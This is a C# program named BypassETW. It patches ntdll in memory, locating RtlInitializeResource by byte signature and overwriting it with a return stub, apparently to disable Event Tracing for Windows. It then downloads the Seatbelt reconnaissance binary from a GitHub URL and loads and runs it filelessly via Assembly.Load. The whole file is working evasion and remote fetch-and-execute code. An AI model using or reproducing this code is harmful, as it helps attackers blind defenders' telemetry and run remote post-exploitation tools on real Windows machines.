using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Net;

namespace BypassETW
{
    public class Program
    {
        // Byte arrays representing the patch code for x64 and the signature (egg) to search for in memory
		// 0x48, 0x33, 0xC0   => XOR RAX, RAX      (Zeroes out the RAX register)
		// 0xC3              => RET                 (Returns from the current function)
        static byte[] patch_code_x64 = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
        static byte[] egg_x64 = new byte[]
        {
            0x4c, 0x8b, 0xdc,                           // mov     r11,rsp
            0x48, 0x83, 0xec, 0x58,                     // sub     rsp,58h
            0x4d, 0x89, 0x4b, 0xe8,                     // mov     qword ptr [r11-18h],r9
            0x33, 0xc0,                                 // xor     eax,eax
            0x45, 0x89, 0x43, 0xe0,                     // mov     dword ptr [r11-20h],r8d
            0x45, 0x33, 0xc9,                           // xor     r9d,r9d
            0x49, 0x89, 0x43, 0xd8,                     // mov     qword ptr [r11-28h],rax
            0x45, 0x33, 0xc0,                           // xor     r8d,r8d
        };

        [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        private static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        // Finds the address of the specified byte pattern (egg) in memory starting from a given address
        private static IntPtr FindAddress(IntPtr address, byte[] egg)
        {
            while (true)
            {
                int count = 0;
                while (true)
                {
                    address = IntPtr.Add(address, 1);
                    if (Marshal.ReadByte(address) == egg[count])
                    {
                        count++;
                        if (count == egg.Length)
                            return IntPtr.Subtract(address, egg.Length - 1);
                    }
                    else
                    {
                        break;
                    }
                }
            }
        }

        // Applies a memory patch by replacing a specific byte pattern in a DLL function with the given patch code
        private static void MemoryPatch(string dllname, string funcname, byte[] egg, byte[] patch)
        {
            uint Oldprotect;
            uint Newprotect;

            IntPtr libAddr = LoadLibrary(dllname);
            IntPtr funcAddr = GetProcAddress(libAddr, funcname);
            IntPtr PatchAddr = FindAddress(funcAddr, egg);
            VirtualProtect(PatchAddr, (UIntPtr)patch.Length, 0x40, out Oldprotect);
            Marshal.Copy(patch, 0, PatchAddr, patch.Length);
            VirtualProtect(PatchAddr, (UIntPtr)patch.Length, Oldprotect, out Newprotect);
        }

        public static void StartPatch()
        {
            MemoryPatch("ntdll.dll", "RtlInitializeResource", egg_x64, patch_code_x64);
        }

        static void Main(string[] args)
        {
            StartPatch();
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            var sb = Assembly.Load(new WebClient().DownloadData("https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe"));
            sb.EntryPoint.Invoke(null, new object[] { new string[] {"" } });
            Console.WriteLine(sb.FullName);
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();  // Waits for the user to press any key
        }
    }
}
